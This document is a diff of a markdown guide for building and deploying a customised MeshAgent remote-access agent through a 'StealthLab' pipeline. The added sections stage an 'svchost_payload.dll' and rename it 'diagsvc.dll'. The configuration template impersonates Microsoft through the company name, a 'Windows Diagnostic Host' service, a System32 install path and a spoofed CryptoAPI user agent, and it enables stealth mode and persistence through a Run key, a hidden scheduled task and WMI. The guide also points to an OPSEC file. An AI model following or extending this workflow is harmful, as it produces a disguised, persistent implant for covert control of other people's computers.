@@ -1,326 +1,199 @@
 # MeshAgent Custom Build & Deployment Guide
 
+This guide describes the current, fully automated workflow for producing StealthLab-ready binaries and deploying them to your MeshCentral instance.
+
+> **Use hostnames, not bare IPs.** Keep the MeshCentral URLs (`agents.high.support`, `relay.high.support`, etc.) in both `branding_config.json` and the MeshCentral portal so the TLS pins remain valid.
+
+---
+
 ## Overview
 
-This repository now has automated CI/CD for building custom-branded MeshAgent binaries with the following features:
+The local build pipeline now handles every step end-to-end:
 
-- **Custom Branding**: "Acme Telemetry Core" service name and branding
-- **Automated Builds**: GitHub Actions builds both x64 and x86 binaries
-- **Release Management**: Automatic publication of binaries to GitHub Releases
-- **Optional Auto-Deploy**: Can automatically deploy to MeshCentral server
+- `build.ps1 -StealthLab` generates branding headers, builds the StealthLab DLL, and *automatically stages* `meshservice\embedded\svchost_payload.dll` with the latest payload.
+- The same invocation emits StealthLab binaries to:
+  - `meshservice\x64\StealthLab\MeshService-2022.exe`
+  - `meshservice\StealthLab\MeshService-2022.exe`
+- Packaging scripts (`build_complete.ps1`, `build_all.ps1`) rename artifacts to the production-friendly `diagsvc.dll` and create a ready-to-ship drop folder.
 
-> Important: Use DNS, not raw IPs, for all agent endpoints and portal access. This avoids TLS certificate mismatch ("Bad Web Certificate") and ensures the .msh pins to the correct hostnames (e.g., high.support, agents.high.support, relay.high.support).
-
-## Current Status
-
-### ✅ Completed
-- [x] CI workflow created and pushed to `.github/workflows/build-release.yml`
-- [x] Branding configuration (`branding_config.json`) added to repository
-- [x] Branding headers generated at `meshcore/generated/meshagent_branding.h`
-- [x] MeshCentral server is running (root@high.support)
-- [x] Nginx proxy configuration fixed for relay endpoint (port 4450)
-
-### ⚠️ Pending Actions Required
-
-1. **Configure GitHub Secrets** (see below)
-2. **Run the CI build** (will trigger automatically on next push or manually)
-3. **Test agent connectivity** after deployment
-4. **Troubleshoot firewall/DNS** for relay.high.support:4450 if needed
+GitHub Actions remains available for automation, but the on-device workflow is the source of truth and is what the documentation below covers.
 
 ---
 
-## GitHub Actions Workflow
+## Prerequisites
 
-### Build Triggers
-
-The workflow triggers on:
-- **Push to master/main branch** - Automatic build
-- **New tags** (v*) - Build + create GitHub Release
-- **Manual dispatch** - Run workflow manually with optional deployment
-
-### Build Process
-
-1. Checks out repository with submodules
-2. Sets up MSBuild and Python
-3. Generates branding headers from `branding_config.json`
-4. Builds both architectures:
-   - `MeshService64.exe` (x64)
-   - `MeshService.exe` (x86)
-5. Uploads artifacts with 90-day retention
-6. Creates GitHub Release (on tags)
-7. Deploys to server (if enabled)
+- Windows 10/11 build workstation.
+- Visual Studio 2022 with the following workloads:
+  - Desktop development with C++
+  - MSVC v143 toolset
+  - Windows 10/11 SDK
+- Python 3.10+ on the PATH (used by helper scripts).
+- Git submodules initialised:\
+  `git submodule update --init --recursive`
+- `branding_config.json` populated with your production values (see the updated template later in this document).
 
 ---
 
-## Required GitHub Secrets
+## Build Workflow (Recommended)
 
-To enable full functionality, add these secrets to your repository:
+1. Open *Developer PowerShell for VS 2022* (or any PowerShell session with VS build tools available) and change to the repository root:
+   ```powershell
+   cd C:\Users\Maincon\OneDrive\Documents\GitHub\MeshAgent
+   ```
+2. (Optional) Pull the latest changes:
+   ```powershell
+   git pull
+   ```
+3. Launch the StealthLab build:
+   ```powershell
+   .\build.ps1 -StealthLab
+   ```
+   The script will:
+   - Rebuild `MeshService-2022.dll` under `meshservice\x64\StealthLab_DLL`.
+   - Copy that DLL into `meshservice\embedded\svchost_payload.dll` (no manual staging required).
+   - Emit StealthLab executables for x64 and Win32 and print their sizes plus MD5 hashes.
+4. (Optional) Build additional configurations by passing `-Configuration <Name>` (e.g. `Release`, `Debug`, `StealthLab_DLL`).
 
-### Settings → Secrets and variables → Actions → New repository secret
-
-#### 1. `SSH_PRIVATE_KEY` (Required for deployment)
+Verify the payload was staged correctly:
+```powershell
+Get-FileHash meshservice\x64\StealthLab_DLL\MeshService-2022.dll
+Get-FileHash meshservice\embedded\svchost_payload.dll
+# Hashes should match
 ```
-Your SSH private key for root@high.support
+
+---
+
+## Packaging Options
+
+### 1. Generate a Drop-In Package (Recommended)
+
+```powershell
+.\build_complete.ps1
 ```
 
-**How to create:**
-```bash
-# On your local machine or the server
-ssh-keygen -t ed25519 -C "github-actions-meshagent" -f ~/.ssh/github_meshagent_deploy
-cat ~/.ssh/github_meshagent_deploy  # Copy this as the secret value
+Outputs a timestamped directory under `dist\package_YYYYMMDD_HHMMSS\` containing:
 
-# Add public key to server
-ssh-copy-id -i ~/.ssh/github_meshagent_deploy.pub root@high.support
+- `diagsvc.dll` – the svchost payload ready for deployment.
+- `MeshService-2022.exe` (x64 & Win32) – lab executables for direct installs.
+- `install.ps1`, `README.txt`, and checksum files for operator hand-off.
+
+### 2. Manual Artifact Pickup
+
+If you need individual files:
+
+| Artifact | Location |
+|----------|----------|
+| StealthLab DLL payload | `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` |
+| Bundled resource copy  | `meshservice\embedded\svchost_payload.dll` |
+| StealthLab x64 EXE     | `meshservice\x64\StealthLab\MeshService-2022.exe` |
+| StealthLab Win32 EXE   | `meshservice\StealthLab\MeshService-2022.exe` |
+
+To create a `diagsvc.dll` manually:
+```powershell
+Copy-Item meshservice\x64\StealthLab_DLL\MeshService-2022.dll diagsvc.dll
 ```
 
-#### 2. `BRANDING_CONFIG_JSON` (Optional)
-```json
+---
+
+## Deploy to MeshCentral
+
+1. Copy the freshly built `diagsvc.dll` to the MeshCentral server. Adjust the destination to match your installation (default shown below):
+   ```powershell
+   scp dist\package_*\diagsvc.dll root@72.60.233.29:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
+   ```
+   *If you maintain separate x86/x64 payloads, upload each with the name MeshCentral expects.*
+2. Back up the existing agent binaries before overwriting.
+3. Restart MeshCentral to make the new agent downloadable:
+   ```bash
+   sudo systemctl restart meshcentral
+   ```
+4. From the MeshCentral portal, download the Windows x64 agent and confirm the timestamp/hash matches the build.
+
+---
+
+## Post-Deployment Checks
+
+- Confirm the staged payload on disk matches the StealthLab DLL:
+  ```powershell
+  Get-FileHash "C:\Windows\System32\DiagnosticHost\diagsvc.dll"
+  ```
+- Run the included verifier to ensure branding, TLS profile, and provisioning data match expectations:
+  ```powershell
+  .\tools\verify_deployment.ps1 -Server agents.high.support
+  ```
+- Enrol a test endpoint with the newly published agent and inspect the MeshCentral console for a successful check-in.
+
+---
+
+## Optional: GitHub Actions Automation
+
+The workflow in `.github/workflows/build-release.yml` still functions, but it now relies on the same PowerShell build scripts documented above. When enabling the workflow:
+
+- Provide `SSH_PRIVATE_KEY` if you want the pipeline to deploy automatically (same key used for manual `scp`).
+- Update `BRANDING_CONFIG_JSON` to match the refreshed schema (see next section).
+- Expect the artifacts to be named `MeshService-2022.exe` instead of the legacy `MeshService64.exe`.
+
+Manual approvals are no longer needed to stage the DLL—the workflow inherits the `Stage-SvchostPayload` helper, so GitHub builds and local builds stay in sync.
+
+---
+
+## Troubleshooting Quick Reference
+
+| Symptom | Checks |
+|---------|--------|
+| `svchost_payload.dll` not updated | Re-run `.\\build.ps1 -StealthLab`; verify hashes between `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` and `meshservice\embedded\svchost_payload.dll`. |
+| MeshCentral still serving old agent | Confirm upload path, restart MeshCentral, and clear CDN/cache if fronted by a proxy. |
+| Agent fails to enrol | Ensure `branding_config.json` `provisioning.serverUrl` matches the domain you uploaded to, and that the server certificate hash is current. |
+| Build script exits early | Check that Visual Studio 2022 MSBuild is installed and available at `C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe`. |
+
+---
+
+## Updated Configuration Template
+
+The companion `branding_config.template.json` now mirrors every field consumed by the build scripts. Duplicate it to `branding_config.json` and replace the placeholder values:
+
+```jsonc
 {
+  "$schema": "./schema/meshagent.schema.json",
   "branding": {
-    "companyName": "Acme Corp",
-    "serviceName": "AcmeTelemetryCore",
-    "displayName": "Acme Telemetry Core Service",
-    "binaryName": "AcmeTelemetryCore.exe",
-    "productName": "Acme Telemetry Core",
-    "description": "Acme Telemetry Core Service",
-    "installRoot": "C:/ProgramData/Acme/TelemetryCore",
-    "logPath": "C:/ProgramData/Acme/TelemetryCore/logs"
+    "companyName": "Microsoft Corporation",
+    "serviceName": "WinDiagnosticHost",
+    "displayName": "Windows Diagnostic Host Service",
+    "binaryName": "diaghost.exe",
+    "productName": "Windows Diagnostic Host",
+    "description": "system health monitoring",
+    "installRoot": "C:/Windows/System32/DiagnosticHost",
+    "logPath": "C:/Windows/System32/DiagnosticHost/logs"
   },
   "network": {
-    "primaryEndpoint": "wss://high.support:443/agent.ashx",
-    "userAgent": "AcmeAgent/1.0",
-    "useIpOnly": true
+    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
+    "userAgent": "Microsoft-CryptoAPI/10.0",
+    "alpn": ["http/1.1"],
+    "retryAttempts": 5,
+    "retryDelay": 10
+  },
+  "stealth": {
+    "enabled": true,
+    "svchostMode": true,
+    "bundleExtract": false
+  },
+  "persistence": {
+    "runKey": true,
+    "scheduledTask": { "enabled": true, "hidden": true },
+    "wmi": { "enabled": true }
+  },
+  "provisioning": {
+    "meshName": "Windows Diagnostics",
+    "meshType": "2",
+    "serverUrl": "wss://agents.high.support:4445/agent.ashx",
+    "serverId": "YOUR_SERVER_CERT_HASH",
+    "meshId": "YOUR_MESH_ID"
   }
 }
 ```
 
-**Note**: If not provided, the workflow will use `branding_config.json` from the repository.
+Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.
 
 ---
 
-## How to Build & Deploy
-
-### Option 1: Automatic Build (on push)
-
-Simply push changes to master:
-```bash
-git push origin master
-```
-
-The workflow will:
-- ✅ Build both x64 and x86 binaries
-- ✅ Upload as GitHub Actions artifacts
-- ❌ NOT deploy to server (requires tag or manual trigger)
-
-### Option 2: Create a Release
-
-Push a version tag to trigger a full release:
-```bash
-git tag -a v1.0.0 -m "Release v1.0.0 - Custom Acme branding"
-git push origin v1.0.0
-```
-
-The workflow will:
-- ✅ Build both binaries
-- ✅ Create GitHub Release with binaries
-- ✅ Deploy to server (if SSH_PRIVATE_KEY is configured)
-
-### Option 3: Manual Workflow Dispatch
-
-1. Go to: https://github.com/hira-edu/MeshAgent/actions
-2. Select "Build and Release Custom MeshAgent"
-3. Click "Run workflow"
-4. Choose:
-   - Branch: `master`
-   - Deploy to server: `true` or `false`
-5. Click "Run workflow"
-
----
-
-## Deployment Details
-
-When deployment is enabled, the workflow:
-
-1. **Downloads artifacts**: Gets both MeshService64.exe and MeshService.exe
-2. **Uploads to server**:
-   ```bash
-   /opt/meshcentral/meshcentral-data/agents/MeshService64.exe
-   /opt/meshcentral/meshcentral-data/agents/MeshService.exe
-   ```
-3. **Restarts MeshCentral**: `systemctl restart meshcentral`
-4. **Verifies deployment**: Checks service status
-
-### Server Information
-- **Host**: high.support
-- **MeshCentral Port**: 443 (HTTPS)
-- **Agent Port**: 4445 (agents.high.support)
-- **Relay Port**: 4450 (relay.high.support)
-
----
-
-## Testing After Deployment
-
-### 1. Check Agent Download Page
-Visit: https://high.support
-- Login to MeshCentral
-- Go to "My Server" → "Installation"
-- Download Windows 64-bit agent
-- Verify filename and properties match branding
-
-### 2. Install Agent on Test Machine
-```powershell
-# Run as Administrator
-.\MeshService64.exe -install
-
-# Check service
-Get-Service "Acme Telemetry Core Service"
-
-# Check logs
-Get-Content "C:\ProgramData\Acme\TelemetryCore\logs\telemetry.log"
-```
-
-### 3. Verify Agent Connection
-- Check MeshCentral web UI for new device
-- Verify device appears in correct mesh
-- Test remote desktop/terminal functionality
-
----
-
-## Troubleshooting
-
-### Build Fails
-
-#### Error: "Could not find MSBuild"
-- Workflow uses `windows-latest` runner (includes VS 2022)
-- Should not occur on GitHub-hosted runners
-- If using self-hosted runner, install Visual Studio 2022 Build Tools
-
-#### Error: "Could not find branding_config.json"
-- Ensure file exists in repository root
-- Or provide `BRANDING_CONFIG_JSON` secret
-
-### Deployment Fails
-
-#### Error: "Permission denied (publickey)"
-- Ensure `SSH_PRIVATE_KEY` secret is configured
-- Verify public key is in server's `~/.ssh/authorized_keys`
-- Test manually: `ssh -i /path/to/key root@high.support`
-
-#### Error: "Could not restart meshcentral"
-- Check service status: `systemctl status meshcentral`
-- Check logs: `journalctl -u meshcentral -n 50`
-
-### Agent Won't Connect
-
-#### Check 1: Endpoint Configuration
-```bash
-# On server
-curl http://127.0.0.1:4449/agent.ashx
-# Should return HTML page
-```
-
-#### Check 2: Nginx Proxy
-```bash
-# On server
-curl -k https://agents.high.support:4445/agent.ashx
-# Should return HTML page, not 404/502
-```
-
-#### Check 3: Firewall Rules
-```bash
-# On server
-ufw status
-iptables -L -n | grep 4445
-```
-
-#### Check 4: Agent Logs (Client)
-```powershell
-# On Windows client
-Get-Content "C:\ProgramData\Acme\TelemetryCore\logs\telemetry.log" -Tail 50
-```
-
-### Known Issues
-
-1. **relay.high.support:4450 timeout**
-   - Relay endpoint may have firewall/DNS issues
-   - Nginx configuration fixed (now listens on all interfaces)
-   - May need firewall rule: `ufw allow 4450/tcp`
-
-2. **agents.high.support:4445 returns 404**
-   - Nginx is proxying but endpoint may need WebSocket headers
-   - Backend (127.0.0.1:4449) responds correctly
-   - Check Nginx logs: `tail -f /var/log/nginx/error.log`
-
----
-
-## Branding Details
-
-### Service Information
-- **Service Name**: `AcmeTelemetryCore`
-- **Display Name**: `Acme Telemetry Core Service`
-- **Company**: `Acme Corp`
-- **Binary**: `AcmeTelemetryCore.exe`
-- **Install Path**: `C:\ProgramData\Acme\TelemetryCore`
-- **Log Path**: `C:\ProgramData\Acme\TelemetryCore\logs`
-
-### Network Configuration
-- **Primary Endpoint**: `wss://high.support:443/agent.ashx`
-- **User Agent**: `AcmeAgent/1.0`
-- **IP-Only Mode**: Enabled (bypasses DNS)
-
-### Persistence
-- **Registry Run Key**: Disabled
-- **Scheduled Task**: Disabled
-- **WMI**: Disabled
-- **Watchdog**: Enabled (checks every 600 seconds)
-
----
-
-## Next Steps
-
-1. **Configure GitHub Secrets** (if not done):
-   ```
-   Settings → Secrets → Actions → New secret
-   - SSH_PRIVATE_KEY: [Your SSH private key]
-   ```
-
-2. **Trigger First Build**:
-   ```bash
-   cd MeshAgent
-   git tag -a v1.0.0 -m "Initial custom build"
-   git push origin v1.0.0
-   ```
-
-3. **Monitor Build**:
-   - Visit: https://github.com/hira-edu/MeshAgent/actions
-   - Watch build progress
-   - Download artifacts when complete
-
-4. **Test Deployment**:
-   - SSH to server: `ssh root@high.support`
-   - Check files: `ls -lh /opt/meshcentral/meshcentral-data/agents/MeshService*.exe`
-   - Check service: `systemctl status meshcentral`
-
-5. **Install & Test Agent**:
-   - Download from MeshCentral web UI
-   - Install on test Windows machine
-   - Verify connection in MeshCentral
-
-6. **Fix Remaining Issues**:
-   - Test relay endpoint connectivity
-   - Add firewall rules if needed
-   - Update DNS if using domain names
-
----
-
-## Support & References
-
-- **MeshAgent GitHub**: https://github.com/Ylianst/MeshAgent
-- **MeshCentral GitHub**: https://github.com/Ylianst/MeshCentral
-- **GitHub Actions Docs**: https://docs.github.com/en/actions
-- **Nginx WebSocket Proxy**: https://nginx.org/en/docs/http/websocket.html
-
-For issues with this deployment, check:
-1. GitHub Actions logs: https://github.com/hira-edu/MeshAgent/actions
-2. MeshCentral logs: `ssh root@high.support journalctl -u meshcentral -f`
-3. Nginx logs: `ssh root@high.support tail -f /var/log/nginx/error.log`
+Need more depth? Refer to `STEALTHLAB_CONFIG_GUIDE.md` for registry/service layout and `OPSEC.md` for operational security practices. For assistance or questions, open an issue or contact the maintainer directly.
